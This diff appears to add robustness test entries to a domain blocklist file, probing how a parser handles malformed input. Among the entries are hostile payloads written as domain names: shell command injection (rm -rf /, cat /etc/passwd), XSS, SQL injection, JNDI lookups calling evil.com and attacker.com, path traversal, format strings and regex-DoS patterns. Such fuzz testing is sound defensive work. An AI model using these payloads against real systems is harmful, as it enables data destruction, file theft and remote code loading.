@@ -4,3 +4,139 @@ www.gmail.com
 www.facebook.com
 www.hinge.com
 www.cnn.com
+# Normal entry first
+malware.example.com
+
+# Format violations
+.leading-dot.com
+trailing-dot.com.
+..double-dots..com
+domain..double-dot.com
+-leading-hyphen.com
+trailing-hyphen-.com
+domain_with_underscores.com
+UPPERCASE-DOMAIN.COM
+mixed.Case.Domain.Com
+
+# Invalid characters
+domain with spaces.com
+domain,with,commas.com
+domain;with;semicolons.com
+domain|with|pipes.com
+domain"with"quotes.com
+domain'with'apostrophes.com
+domain<with>brackets.com
+domain[with]square.com
+domain{with}curly.com
+domain(with)parens.com
+
+# Unicode domains
+тест.рф
+الاختبار.com
+测试.cn
+テスト.jp
+
+# Special characters
+domain-with-€-symbol.com
+domain-with-©-copyright.com
+domain-with-®-registered.com
+
+# Non-printable characters (add actual bytes)
+domain-with-null-byte.com
+domain-with-tab character.com
+domain-with-newline
+character.com
+
+# URL encoding attempts
+domain%20with%20spaces.com
+domain%2Ewith%2Edots.com
+domain%00null.com
+
+# Extremely long domain names
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.example.com
+
+# Deep subdomain nesting
+a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.x.y.z.very.deep.subdomain.example.com
+
+# Repetitive patterns (copy this line thousands of times)
+subdomain1.example.com
+subdomain2.example.com
+subdomain3.example.com
+
+
+# Command injection attempts
+$(rm -rf /).com
+`whoami`.com
+|ls -la|.com
+;cat /etc/passwd;.com
+&& rm -rf / &&.com
+
+# Script injection
+<script>alert('xss')</script>.com
+javascript:alert(1).com
+data:text/html,<script>alert(1)</script>.com
+
+# SQL injection patterns
+'; DROP TABLE domains; --.com
+' OR '1'='1.com
+UNION SELECT * FROM users--.com
+
+# LDAP injection
+${jndi:ldap://evil.com/exploit}.com
+${jndi:rmi://attacker.com/evil}.com
+
+# Path traversal
+../../../etc/passwd.com
+..\..\..\..\windows\system32\drivers\etc\hosts.com
+
+# Format string vulnerabilities
+%s%s%s%s%s%s%s%s.com
+%x%x%x%x%x%x.com
+%n%n%n%n.com
+${%25n}.com
+# CSV format attempt
+domain1.com,blocked,malware
+domain2.com,allowed,clean
+
+# JSON format attempt
+{"domain": "test1.com", "action": "block"}
+[{"domain": "test2.com"}]
+
+# XML format attempt
+<domain>test3.com</domain>
+<blocked_domains><domain>test4.com</domain></blocked_domains>
+
+# YAML format attempt
+
+domains:
+  - test5.com
+  - test6.com
+
+# INI format attempt
+[blocked_domains]
+domain1=test7.com
+domain2=test8.com
+
+# Different comment styles
+// this is a comment with domain.com
+/* comment with domain.com */
+-- SQL comment with domain.com
+# Normal comment
+
+# Different delimiters
+domain1.com;domain2.com
+domain3.com|domain4.com
+domain5.com,domain6.com
+domain7.com domain8.com
+domain9.com     domain10.com
+
+# Mixed line endings (create with different tools)
+domain-with-crlf.com
+domain-with-lf.com
+domain-with-cr.com
+
+# Patterns that can cause regex engines to hang
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab.com
+(a+)+b.example.com
+(a|a)*b.example.com
+a*a*a*a*a*a*a*a*a*a*b.com
